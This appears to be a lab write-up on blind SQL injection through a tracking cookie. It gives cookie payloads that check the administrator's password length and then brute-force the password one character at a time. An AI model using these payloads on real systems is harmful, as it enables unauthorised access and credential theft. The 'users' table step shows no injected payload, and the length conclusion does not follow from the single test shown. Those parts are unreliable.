
---
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and ==*performs a SQL query containing the value of the submitted cookie*==.

Volurnability : When executing SQL queries, website sent a cookie submitted by users directly.

Brup Intruder :
```
Cookie: TrackingId=eQS2B59pt7c8lPB5; session=kjiLKlnqlBeJC3jJ7L4QC9eK3wfJjnxB
```

Set Cookie to check if database 'users' exists :

`Cookie: TrackingId=eQS2B59pt7c8lPB5; session=kjiLKlnqlBeJC3jJ7L4QC9eK3wfJjnxB`

HTTP respond Welcome back! So dtabase 'users' exists.

Now we check the password length of user 'administrator' use the fellowing statement :

`Cookie: TrackingId=eQS2B59pt7c8lPB5' and (select 'a' from users where username = 'administrator' and length(password) > 20) = 'a' --; session=kjiLKlnqlBeJC3jJ7L4QC9eK3wfJjnxB`

HTTP didn't respond Welcome back! , so we know password length is 20

Now use brute force :

`Cookie: TrackingId=eQS2B59pt7c8lPB5' and (select substring(password, 1, 1) from users where username = 'administrator' )= 'a' --; session=kjiLKlnqlBeJC3jJ7L4QC9eK3wfJjnxB`

